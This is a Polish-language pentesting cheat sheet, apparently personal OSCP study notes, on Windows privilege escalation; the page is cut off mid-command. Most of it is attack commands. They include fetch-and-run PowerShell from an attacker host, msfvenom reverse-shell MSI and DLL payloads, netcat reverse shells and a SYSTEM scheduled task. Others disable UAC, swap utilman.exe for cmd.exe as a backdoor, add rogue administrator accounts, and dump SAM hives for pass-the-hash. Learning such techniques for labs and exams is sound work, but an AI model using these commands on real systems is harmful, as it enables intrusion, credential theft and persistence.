<div class="entry-content">
		<div id="ez-toc-container" class="ez-toc-v2_0_55 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction">
<div class="ez-toc-title-container">
<p class="ez-toc-title ">Spis treści</p>
<span class="ez-toc-title-toggle"><a href="#" class="ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle ez-toc-loaded" aria-label="Toggle Table of Content" role="button"><label for="item-651e5e7435886"><span class=""><span style="display:none;">Toggle</span><span class="ez-toc-icon-toggle-span"><svg style="fill: #999;color:#999" xmlns="http://www.w3.org/2000/svg" class="list-377408" width="20px" height="20px" viewBox="0 0 24 24" fill="none"><path d="M6 6H4v2h2V6zm14 0H8v2h12V6zM4 11h2v2H4v-2zm16 0H8v2h12v-2zM4 16h2v2H4v-2zm16 0H8v2h12v-2z" fill="currentColor"></path></svg><svg style="fill: #999;color:#999" class="arrow-unsorted-368013" xmlns="http://www.w3.org/2000/svg" width="10px" height="10px" viewBox="0 0 24 24" version="1.2" baseProfile="tiny"><path d="M18.2 9.3l-6.2-6.3-6.2 6.3c-.2.2-.3.4-.3.7s.1.5.3.7c.2.2.4.3.7.3h11c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7s-.1-.5-.3-.7zM5.8 14.7l6.2 6.3 6.2-6.3c.2-.2.3-.5.3-.7s-.1-.5-.3-.7c-.2-.2-.4-.3-.7-.3h-11c-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7s.1.5.3.7z"></path></svg></span></span></label><input aria-label="Toggle" type="checkbox" id="item-651e5e7435886"></a></span></div>
<nav><ul class="ez-toc-list ez-toc-list-level-1 "><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-1" href="#Windows_Priv_Esc" title="Windows Priv Esc">Windows Priv Esc</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Podstawy" title="Podstawy">Podstawy</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Enumeracja" title="Enumeracja">Enumeracja</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Elevate_UAC" title="Elevate, UAC:">Elevate, UAC:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Cron" title="Cron:">Cron:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Procesy_uslugi" title="Procesy, usługi">Procesy, usługi</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Windows_Service_by_oscp23" title="Windows Service by oscp23">Windows Service by oscp23</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Uprawnienia" title="Uprawnienia">Uprawnienia</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#Mount" title="Mount">Mount</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#Passwords" title="Passwords:">Passwords:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#Firewall" title="Firewall:">Firewall:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#Unquoted_Path" title="Unquoted Path">Unquoted Path</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#Impersonation" title="Impersonation">Impersonation</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#Siec" title="Sieć:">Sieć:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#Kernel" title="Kernel:">Kernel:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#Registry" title="Registry">Registry</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#RunAs" title="RunAs:">RunAs:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-18" href="#Startup_Applications" title="Startup Applications">Startup Applications</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-19" href="#DLL_Hijacking" title="DLL Hijacking:">DLL Hijacking:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-20" href="#WSL" title="WSL:">WSL:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-21" href="#Tools" title="Tools">Tools</a></li></ul></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-22" href="#Active_Directory" title="Active Directory">Active Directory</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-23" href="#Podstawy-2" title="Podstawy">Podstawy</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-24" href="#Domena_i_kontroler_domeny" title="Domena i kontroler domeny">Domena i kontroler domeny</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-25" href="#Users" title="Users:">Users:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-26" href="#Groups" title="Groups">Groups</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-27" href="#Computers" title="Computers">Computers</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-28" href="#Shares" title="Shares">Shares</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-29" href="#GPO_zasady_grupy_OU" title="GPO (zasady grupy) &amp; OU">GPO (zasady grupy) &amp; OU</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-30" href="#PTH" title="PTH:">PTH:</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-31" href="#%E2%80%93DCSync" title="–DCSync">–DCSync</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-32" href="#%E2%80%93LSASS" title="–LSASS">–LSASS</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-33" href="#%E2%80%93Wykorzystanie_hasha" title="–Wykorzystanie hasha">–Wykorzystanie hasha</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-34" href="#Wykorzystanie_hasla" title="Wykorzystanie hasła:">Wykorzystanie hasła:</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-35" href="#%E2%80%93Password_cracking" title="–Password cracking">–Password cracking</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-36" href="#%E2%80%93Password_Spray" title="–Password Spray:">–Password Spray:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-37" href="#%E2%80%93Narzedzia" title="–Narzędzia">–Narzędzia</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-38" href="#%E2%80%93WMI" title="–WMI">–WMI</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-39" href="#%E2%80%93WinRM" title="–WinRM">–WinRM</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-40" href="#%E2%80%94_EnterPSSSession" title="— EnterPSSSession">— EnterPSSSession</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-41" href="#%E2%80%93PsExec" title="–PsExec">–PsExec</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-42" href="#PTT" title="PTT:">PTT:</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-43" href="#%E2%80%93Podstawy" title="–Podstawy">–Podstawy</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-44" href="#%E2%80%93Wykorzystanie_Ticketu" title="–Wykorzystanie Ticketu">–Wykorzystanie Ticketu</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-45" href="#DCOM" title="DCOM">DCOM</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-46" href="#Token_Impersonation" title="Token Impersonation">Token Impersonation</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-47" href="#ACL" title="ACL:">ACL:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-48" href="#Session_Hijack" title="Session Hijack">Session Hijack</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-49" href="#SMB_Relay_Attack" title="SMB Relay Attack">SMB Relay Attack</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-50" href="#DNS_Admins" title="DNS Admins">DNS Admins</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-51" href="#Unconstrained_delegation" title="Unconstrained delegation">Unconstrained delegation</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-52" href="#Constrained_Delegation" title="Constrained Delegation">Constrained Delegation</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-53" href="#ZeroLogon_CVE-2020-1472" title="ZeroLogon CVE-2020-1472">ZeroLogon CVE-2020-1472</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-54" href="#SPN" title="SPN:">SPN:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-55" href="#Kerberoasting" title="Kerberoasting:">Kerberoasting:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-56" href="#Silver_Ticket" title="Silver Ticket">Silver Ticket</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-57" href="#Golden_Ticket" title="Golden Ticket:">Golden Ticket:</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-58" href="#Shadow_Copies" title="Shadow Copies">Shadow Copies</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-59" href="#Pre-authentication_not_required_ASREPRoast" title="Pre-authentication not required / ASREPRoast">Pre-authentication not required / ASREPRoast</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-60" href="#SQL_Servers" title="SQL Servers">SQL Servers</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-61" href="#DCShadow" title="DCShadow">DCShadow</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-62" href="#Creds_Dumping" title="Creds Dumping">Creds Dumping</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-63" href="#%E2%80%93LSASS_Memory" title="–LSASS Memory">–LSASS Memory</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-64" href="#%E2%80%93SAM" title="–SAM">–SAM</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-65" href="#%E2%80%93LSA_Secrets" title="–LSA Secrets">–LSA Secrets</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-66" href="#Certyfikaty" title="Certyfikaty">Certyfikaty</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-67" href="#Tools-2" title="Tools">Tools</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-68" href="#PowerView_Download" title="PowerView Download">PowerView Download</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-69" href="#Mimikatz" title="Mimikatz">Mimikatz</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-70" href="#PowerEmpire" title="PowerEmpire">PowerEmpire</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-71" href="#ADReconps1" title="ADRecon.ps1">ADRecon.ps1</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-72" href="#Juicy_Potato" title="Juicy Potato">Juicy Potato</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-73" href="#BloodHound" title="BloodHound">BloodHound</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-74" href="#Rubeus" title="Rubeus">Rubeus</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-75" href="#Impacket_z_Kali" title="Impacket (z Kali)">Impacket (z Kali)</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-76" href="#Meterpreter_dla_AD" title="Meterpreter dla AD">Meterpreter dla AD</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-77" href="#Macro" title="Macro">Macro</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-78" href="#Windows_Library_Attacks" title="Windows Library Attacks">Windows Library Attacks</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-79" href="#PetitPotam_%E2%80%93_NTLM_Relay" title="PetitPotam – NTLM Relay">PetitPotam – NTLM Relay</a></li></ul></li></ul></li></ul></nav></div>

<h2 class="wp-block-heading"><span class="ez-toc-section" id="Windows_Priv_Esc" ez-toc-data-id="#Windows_Priv_Esc"></span>Windows Priv Esc<span class="ez-toc-section-end"></span></h2>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Podstawy" ez-toc-data-id="#Podstawy"></span>Podstawy<span class="ez-toc-section-end"></span></h4>



<p>#whoami ; whoami /priv ; whoami /all ; whoami /groups<br>#hostname<br>#systeminfo   (sprawdź System type czy x64)<br>#echo %userdomain% ; echo %username% ; whoami – ale tylko w cmd<br>#?? polecenia w cmd: move ; shutdown /r /t 0 ; type<br>#dokładniejszy „ls” w PS: <mark style="background-color:#c7ffba" class="has-inline-color">Get-ChildItem -Force</mark><br>#Hacktricks – Checklist Windows Priv Esc <a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation">link</a> i <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">full polecenia</a><br><strong>###bypass poleceń###</strong><br>#cmd.exe /c &lt;commands&gt;<br>#cmd.exe /c start &lt;commands&gt;<br><strong>###IEX###</strong><br>#IEX(New-Object Net.webclient).downloadString(’http://$KALI:9090/skrypt.ps1′)<br><strong>#tworzenie plikow przez PowerShell###</strong><br>#New-Item .\test.txt<br>#&gt; Set-Content .\test.txt 'jakis text’<br># Compress-Archive -LiteralPath C:\PATH\TO\FOLDER -DestinationPath C:\PATH\TO\FILE.zip</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Enumeracja" ez-toc-data-id="#Enumeracja"></span>Enumeracja<span class="ez-toc-section-end"></span></h4>



<p><strong>###Users###</strong><br>#net user<br>#net user offsec np. net user Administrator lub „Device Owners”<br>#net accounts (polityka haseł)<br>#PS: Get-LocalUser | ft Name,Enabled,LastLogon<br>#PS: Get-ChildItem C:\Users -Force | select Name<br><strong>###Grupy lokalne###</strong><br>#PS: Get-LocalGroup<br>#Ps: Get-LocalGroupMember $nazwa-grupy<br>#PS: Get-LocalGroupMember Administrators | ft Name, PrincipalSource (sprawdzi i userow i grupy nalezace do niej)<br>#net localgroup ; <strong>net localgroup administrators</strong> (po polsku mam Administratorzy, pokaże administratorów na maszynie)<br>#”<strong><em>Remote Desktop Users</em></strong>” mają dostęp <strong>RDP</strong> a „<strong><em>Remote Management Users</em></strong>” przez <strong>WinRM</strong> ; ważna też „Backup Operators’<br>#&gt; jeżeli user nie jest w grupach RDP,  WinRM to używamy <strong>Runus</strong> (runus działa tylko z GUI, nie z rev-shell)<br>#&gt; <mark style="background-color:#baffaa" class="has-inline-color has-black-color">runas /user:offsec cmd</mark> (poprosi o podanie hasła)<br><strong>###Dodanie usera###</strong><br>#cmd.exe /c net user siren Password123 /add #&gt;  net localgroup administrators siren /add #&gt; cmd.exe /c net localgroup „Remote Desktop Users” siren /add<br>#dodanie istniejącego usera (np. siebie) do jakieś grupy: Add-ADGroupMember „IT Support” -Members „jankowalski”<br>#PV: Add-DomainGroupMember -Identity 'Domain Admins’ -Member 'student1′ -Domain 'corp’ (chociaż mi nie zadziałało w PowerView)<br>#kod C który utworzy nam usera i doda do grupy admin (kompilujemy do na Windows do exe lub na linux z i686-w64-mingw32-gcc) i podmieniamy w miejsce innego exe (<a href="https://3haker.pl/windows-privilege-escalation/">oscp</a>): <a href="https://3haker.pl/kod-c-ktory-utworzy-nam-usera/">TUTAJ</a> kod. <br><strong>###Podmiana hasła usera###</strong><br>#net user offsec Password123!<br><strong><mark style="background-color:#ffb9f9" class="has-inline-color">##Historia PS by oscp23###</mark></strong><br>#PS: Get-History (pokaze cos jezeli nie uzyto w PS: Clear-History)<br>#PS: (Get-PSReadlineOption).HistorySavePath (pokaze chyba sciezke do pliku z historią)<br>#możesz też użyć mając RDP: Event Viewer &gt; Application … &gt;windows PowerShell<br><strong>###Wykorzystanie poświadczeń do stworzenie sesji zdalnej przez WinRM chyba z innym komputerem oscp23:###</strong><br>#&gt; $password = ConvertTo-SecureString „<em>qwertqwertqwert123!!</em>” -AsPlainText -Force<br>#&gt; $cred = New-Object System.Management.Automation.PSCredential(„<em>daveadmin”</em>, $password)<br>#&gt; Enter-PSSession -ComputerName <em>CLIENTWK220</em> -Credential $cred (i masz sesje na innej maszynie)<br>#a jak mamy możliwość WinRM to lepiej użyć narzędzia: evil-winrm -i 192.168.50.220 -u daveadmin -p „qwertqwertqwert123\!\!” (ps. po zalogowaniu skorzystaj z menu #&gt; np. services)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Elevate_UAC" ez-toc-data-id="#Elevate_UAC"></span>Elevate, UAC:<span class="ez-toc-section-end"></span></h4>



<p>#uruchomienie powershell jako elevated (ale i tak musisz być adminem): <strong>powershell.exe Start-Process cmd.exe -Verb runAs</strong><br>#sprawdz jakie mas priv: net localgroup administrators (musisz tu być do elevated)<br>#<a href="https://3haker.pl/windows-privilege-escalation/">fodhelper</a>.exe w /system 32/ (<a href="https://3haker.pl/windows-privilege-escalation/">tutaj</a> lab oscp22)<br>#./PsExec.exe -s \localhost cmd<br>#<mark style="background-color:#dbffd3" class="has-inline-color">psexec.exe -accepteula -s cmd.exe</mark><br>#Dodawanie komendy do Rejestru (<a href="https://3haker.pl/windows-privilege-escalation/">oscp</a>): REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command<br>#listowanie usług które moga nam pomóc elevate: Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running’} (<a href="https://3haker.pl/windows-privilege-escalation/">oscp</a> z instrukcją)<br>#UAC Protection Bypass <a href="https://www.exploit-db.com/exploits/46998">exploit</a> w Powershell<br>#podobno tez dobry .exe z offs <a href="https://github.com/hfiref0x/UACME">git</a>   #&gt;  C:\tools\UACME-Akagi64.exe 33<br>#<a href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/">artykul</a> zebranie roznych metod<br>#CVE-2019-1388 Abuse UAC Windows Certificate Dialog  (jak klikniejsz Run as Adminsitrator i jest link  Shod details &gt; Show information about the publisher’s certificate nad form logowania) <a href="https://github.com/nobodyatall648/CVE-2019-1388">instrukcja</a>  i  <a href="https://www.youtube.com/watch?v=RW5l6dQ8H-8">YT</a><br><strong>###S1ren, patrz też poniżej bo to samo###</strong><br>#reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>#reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>[Installing Elevated]<br>#msiexec /i PATH_TO_MSI_FILE np. C:&gt;msiexec /i „C:\xamoo\htdocs\shenzi\siren.msi” (<a href="https://3haker.pl/holiday-box-walkthrough-with-s1ren-shenzi-pg-practice/">tutaj</a> lab)<br><strong>###AlwaysInstallElevated###</strong><br><em>If these 2 registers are enabled (value is <strong>0x1</strong>), users of any privilege can install (execute) .msi files as NT AUTHORITY\SYSTEM.</em><br>#—-Check registers:<br>#–OPTION 1:<br>#reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>#reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>#–OPTION 2:<br>#reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br>#reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br><strong>##Exploit do w/w##</strong><br>#msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f msi &gt; rshell.msi (generate MSI payload in Kali)<br>#msiexec /quiet /qn /i C:\temp\rshell.msi<br>#x86_64-w64-mingw32-gcc ~/OSCP-2022/Tools/privesc-windows/uac-bypass.c -o uac-bypass.exe (lub inna architektura)  #&gt; na Windows: .\uac-bypass.exe<br><strong>###Msfconsole###</strong><br>#use exploit/windows/local/bypassuac (Bypass UAC on Windows 7 + Set target + arch, x86/64)<br>#jeżeli masz sesje jako administrator na maszynie: exploit/windows/local/bypassuac_injection #&gt; domyślnie jest 32bit więc może trzeba zmienić payload: set payload windows/x64/meterpreter/reverse_tcp + set TARGET Windows\ x64 + zmiana portu i run #&gt; getsystem #&gt; getuid #&gt; hashdump<br><strong>###Czy potrzebujesz UAC?###</strong><br>#whoami /groups (is „Mandatgory Label\XXX Mandatory Level” set to MEDIUM?)<br>#psexec.exe -i -accepteula -d -s rshell.exe (are we getting issues running psexec as SYSTEM?)<br><strong>###Czy UAC jest włączone i próba wyłączenia###</strong><br>#reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System (czy pisze: UAC Enable)<br>#reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /d 0 /t REG_DWORD<br><strong>###Bypass UAC – User Access Controll###</strong><br>#<br><strong>###G Tworek – przywileje z whoami np. SeBackup###</strong><br>#<a href="https://github.com/gtworek/Priv2Admin">link</a> do git z listą i narzędziami na priv esc<br>#—- <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">link</a> po wiecej  i <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">tu</a> ciekawy artykul o roznych metodach<br>#whoami /priv #&gt; SeBackupPrivilege disabled? Enable it #&gt; File Transfer those two dll #&gt; Import-Module .\SeBackupPrivilegeUtils.dll #&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll #&gt; Set-SeBackupPrivilege #&gt; Get-SeBackupPrivilege #&gt; cd c:\ #&gt; mkdir Temp #&gt; reg save hklm\sam c:\Temp\sam #&gt; reg save hklm\system c:\Temp\system #&gt; File transfer them to kali #&gt; pypykatz registry –sam sam system #&gt; Pass the hash using evil-winrm – evil-winrm -i ip -u user -H „hash”<br><strong>###Adamski , przejście z Medium Mandatory Level###</strong><br>#ten na <a href="https://github.com/k4sth4/UAC-bypass?fbclid=IwAR1YZwUMKsA4Twzbr5F5lvqe7LgqALu19NgJ6ONmUA_wn9zhZcSSWFH_tZo">git</a> plik .c do kompilacji (patrz w/w kompilacja: x86_64…), zwłaszcaa „eventvwr” skuteczna<br>#lub: psexec.exe -d -h -i c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<br><strong>####SeManageVolumePrivilege###</strong><br>#SeManageVolumeExploit.exe<br>#przez msfvenom generuje Printconfig.dll z rev-shell na Kali<br>#copy Printcopy.dll C:\Windows\System32\spool\drivers\x64\3\<br>#&gt; powershell<br>#&gt; $type = [Type]::GetTypeFromCLSID(„{854A20FB-2D44-457D-992F-EF13785D2B51}”)<br>#&gt; $object = [Activator]::CreateInstance($type)<br>#&gt; i mamy revshella jako nr authority na Kalim na których nasłuchowaliśny<br><strong>###SeRestorePrivilege###</strong><br>#<a href="https://github.com/gtworek/Priv2Admin">git</a> tworka super opisuje co zrobic<br>#— lab siddicky<br>#najpierw uzywa <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">tego</a> .ps1 tworka do enable funkcji<br>#&gt; PS&gt; Enable SeRestorePrivilege<br>#&gt;cd \windows\system32  #&gt; move utilmam.exe utilmam.exe.back #&gt; moce cmd.exe utilman.exe <br>#&gt;rdesktop DC01 #&gt; klikan klawisze Win+U i wyskakuje mu cmd.exe (uprawenianie system) zamiast innego programu<br><strong>###SeCreateTokenPrivilege###</strong><br>#follow: https://www.greyhathacker.net/?p=1025<br>###Server Operator Group w AD###<br>#<a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">artykul</a><br><strong>###SeTakeOwnership###</strong><br>#takeown /f C:\Windows\System32\Utilman.exe<br>#icacls C:\Windows\System32\Utilman.exe /grant Everyone:F<br>#C:\Windows\System32&gt; copy cmd.exe utilman.exe  (Click the Ease of Access button on the logon screen to get a shell with NT Authority\System privileges)<br><strong>###SeAssignPrimaryToken###</strong><br>#TCM mówi że to w sumie to samo co SeImpersonate !!<br>#This allows a user to impersonate tokens using exploit tools such as rottenpotato.exe (<a href="https://github.com/breenmachine/RottenPotatoNG/tree/master/RottenPotatoEXE/x64/Release">pobierz</a>)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Cron" ez-toc-data-id="#Cron"></span><strong>Cron</strong>:<span class="ez-toc-section-end"></span></h4>



<p><em>podmiana .exe lub dopisanie czegoś do .bat</em> (np. user /add rabakuku …) -&gt; reboot system: shutdown /f</p>



<p>#<mark style="background-color:#a1ff8c" class="has-inline-color"><a href="https://3haker.pl/privilege-escalation/">schtasks</a> /query /fo LIST /v</mark> (zapis &gt; schtasks.txt)<br>#tasklist /SVC (dla konkretnej usługi) LUB tasklist /v<br>#time #&gt; at 06:42 /interactive „C:\Tools\sirenMaint.exe”<br>#Create a Task. Run as System. Every 5 minutes. Path to binary.<br>schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn RUNME /tr „\”C:\Tools\sirenMaint.exe\”” #&gt; na Kalim: nc -lvp 443 #&gt; na ofiary: schtasks /RUN /TN „RUNME”<br>#sprawdzanie czy jest autostart w ogole wlaczony w cmd: sc qc IKEEXT (a wymusznie wlaczenia: sc start IKEEXT, jezelu masz uprawnienia)<br>#reg query – pliki binarne przy startupie (chyba rejestr)<br><strong>###Tools###</strong><br>#Jaws pokaże – ważne są te Run as Administrator<br><strong><mark style="background-color:#faa9ff" class="has-inline-color">###oscp23###</mark></strong><br>#PS: Get-ScheduledTask<br>#PS: schtasks /query /fo LIST /v  (lepsze, bo pokazuje jako jaki user uruchamiana jest usluga: Author, TaskName, Task To Run, Run As User, and Next Run Time  ;   znajdujemy odpowidni exe i sprawdzamy przez icacls nasze prawa)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Procesy_uslugi" ez-toc-data-id="#Procesy_uslugi"></span>Procesy, usługi<span class="ez-toc-section-end"></span></h4>



<p><strong>###wmic###</strong><a href="https://www.computerhope.com/wmic.htm">opis</a> <br>#<mark style="background-color:#bbffac" class="has-inline-color">wmic service get name,displayname,pathname,startmode</mark>  (najlepsze do poznania nazwy serwisu)<br>#wmic service get name,displayname,pathname,startmode | findstr /i „auto” (z auto to działające usługi) (z filtrem na slowo)<br>#wmic service get name,startname | FINDSTR „NT” (List out all NT AUTHORITY/SYSTEM Services.)<br>#wmic product get name, version, vendor<br>#wmic qfe get Caption, Description, HotFixID, InstalledOn (daty aktualizacji, UWAGA na spacje po przecinkach usuń)<br>#wmic product get name, version, vendor LUB wmic qfe get Caption, Description, HotFixID, InstalledOn (listowanie aplikacji Windows:)<br>#wmic qfe get Caption,Description,HotFixID,InstalledOn (przegląd patchy)<br>#wmic service get name,displayname,pathname,startmode |findstr /i „auto” |findstr /i /v „c:\windows” (ignoracja folderu)<br>#wmic service where caption=”Serviio” get name, caption, state, startmode (ponowne uruchomieni usługi)<br>#sc.exe qc $nazwa_serwi (uprawnienia) w PS sc.exe bo samo sc oznacza cos innego<br>#<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">hacktricks</a> o service<br>#Start-Process -FilePath „C:\nc64.exe” -ArgumentList „$KALI $PORT -e 